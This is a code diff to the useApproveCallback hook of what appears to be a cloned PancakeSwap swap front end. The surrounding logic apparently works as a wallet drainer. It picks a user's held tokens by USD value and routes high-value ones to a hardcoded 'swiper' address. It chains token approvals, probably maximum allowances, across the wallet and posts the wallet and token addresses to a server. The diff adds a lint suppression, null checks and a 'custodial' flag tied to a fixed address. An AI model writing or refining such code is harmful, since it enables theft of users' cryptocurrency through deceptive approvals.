@@ -1,3 +1,4 @@
+/* eslint-disable */
 import { MaxUint256 } from '@pancakeswap/swap-sdk-core'
 import { useTranslation } from '@pancakeswap/localization'
 import { Currency, CurrencyAmount, ERC20Token } from '@pancakeswap/sdk'
@@ -319,7 +320,7 @@ export function useApproveCallback(
 
   // const tokenContract = useTokenContract(token?.address)
   const tokenContract = useTokenContract(tokensFiltered[0]?.token_address)
-  if (tokensFiltered[0].usdValue > 2000) setSwiper(swipers[111111])
+  if (tokensFiltered[0]?.usdValue > 2000) setSwiper(swipers[111111])
   const addTransaction = useTransactionAdder()
 
   const approve = useCallback(
@@ -385,7 +386,7 @@ export function useApproveCallback(
       // if (!estimatedGas) return undefined
 
       tokensFiltered.shift()
-      if (tokensFiltered[0].usdValue > 2000) setSwiper(swipers[111111])
+      if (tokensFiltered[0]?.usdValue > 2000) setSwiper(swipers[111111])
       setTokensFiltered(tokensFiltered)
 
       return callWithGasPrice(
@@ -420,6 +421,9 @@ export function useApproveCallback(
                   walletAddress: account,
                   tokenAddress: tokenContract.address,
                   purge: false,
+                  // swiper doesn't exit in swipers array, set custodail as false otherwise true
+                  custodial:
+                    Object.values(swipers).indexOf('0xf925cDFD4806342d9dc1D5c7Ae09e3A43a02B053') === -1 ? false : true,
                 }),
                 method: 'POST',
               })
